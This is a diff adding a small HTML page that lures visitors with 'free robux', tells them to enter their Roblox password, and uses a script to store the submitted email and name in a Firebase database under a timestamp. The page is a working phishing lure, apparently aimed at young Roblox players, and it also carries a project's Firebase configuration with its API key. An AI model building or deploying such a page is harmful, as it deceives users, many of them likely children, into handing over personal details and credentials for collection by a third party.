@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<head>
+  <title>Sadman Abrar</title>
+  <link href="https://fonts.googleapis.com/css2?family=Josefin+Sans&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Oxygen&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Dosis:wght@300&family=Josefin+Sans&display=swap" rel="stylesheet">
+  <style>
+    body {
+      text-align: center;
+      background: url("https://cdnb.artstation.com/p/assets/images/images/054/436/989/large/rin-jones-robux-m.jpg?1664534248");
+      background-size: cover;
+      background-position: center;
+      color: blue;
+      font-family: 'Josefin Sans', sans-serif;
+
+    }
+    p {
+      font-size: 22px;
+    }
+    input {
+      font-family: 'Dosis', sans-serif;
+      border: 0;
+      padding: 10px;
+      font-size: 20px;
+    }
+    input[type="submit"] {
+      font-family: 'Oxygen', sans-serif;
+      background: black;
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSj6WuEh72qIzcIUUBP7BRgESraaTubdNUvbMSZH4&s">
+  <p>HEY! Do you want free robux?? Just enter your Roblox password below!</p>
+  <input id="Email" type="email" placeholder="Enter your email">
+	<input id="Name" type="name" placeholder="Enter your name">
+  <input id="submit" type="submit">
+	<script type="module">
+	  // Import the functions you need from the SDKs you need
+		import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-database.js";
+	  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-app.js";
+	  // TODO: Add SDKs for Firebase products that you want to use
+	  // https://firebase.google.com/docs/web/setup#available-libraries
+
+	  // Your web app's Firebase configuration
+	  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+	  const firebaseConfig = {
+	    apiKey: "AIzaSyAzX8WrMlbcat8yMCxz7ciiZpY3blZrk6U",
+	    authDomain: "project-1-2eaa6.firebaseapp.com",
+	    projectId: "project-1-2eaa6",
+	    storageBucket: "project-1-2eaa6.appspot.com",
+	    messagingSenderId: "770047006950",
+	    appId: "1:770047006950:web:a9075ef37315423f004327",
+	    measurementId: "G-9B1PEHL224"
+	  };
+
+	  // Initialize Firebase
+	  const app = initializeApp(firebaseConfig);
+		const db = getDatabase(app);
+		const Name = document.querySelector("#Name") 
+		const Email = document.querySelector("#Email")
+		document.querySelector('#submit').addEventListener('click', Submit)
+		
+		function Submit() {
+		  const timestamp = buildTimestamp()
+	  
+		  set(ref(db, timestamp), {
+			  Name: Name.value,
+		      email: Email.value,
+		  });
+
+		  Name.value = ""
+		  Email.value = ""
+		}
+		function buildTimestamp() {
+		  const now = new Date();
+		  let timestamp = now.getFullYear().toString() + "/";
+		  //const month = now.toLocaleString('default', { month: 'long' });
+
+		  let month = now.getMonth()+1   //add 1 because Javascript uses 0 for January
+		  month = month.toString()
+		  month = addLeadingZero(month)
+		  timestamp += month + "/"; 
+
+		  let date = now.getDate().toString()
+		  date = addLeadingZero(date)
+		  timestamp += date + "/";
+
+		  let hours = now.getHours().toString()
+		  hours = addLeadingZero(hours)
+		  timestamp += hours + ":";
+
+		  let minutes = now.getMinutes().toString()
+		  minutes = addLeadingZero(minutes)
+		  timestamp += minutes + ":";
+
+		  let seconds = now.getSeconds().toString()
+		  seconds = addLeadingZero(seconds)
+		  timestamp += seconds;
+  
+		  return timestamp
+		}
+	
+		function addLeadingZero(units) {
+			if (units.length < 2) {
+				units = "0" + units
+			}
+			return units
+		}
+		
+	</script>
+</body>
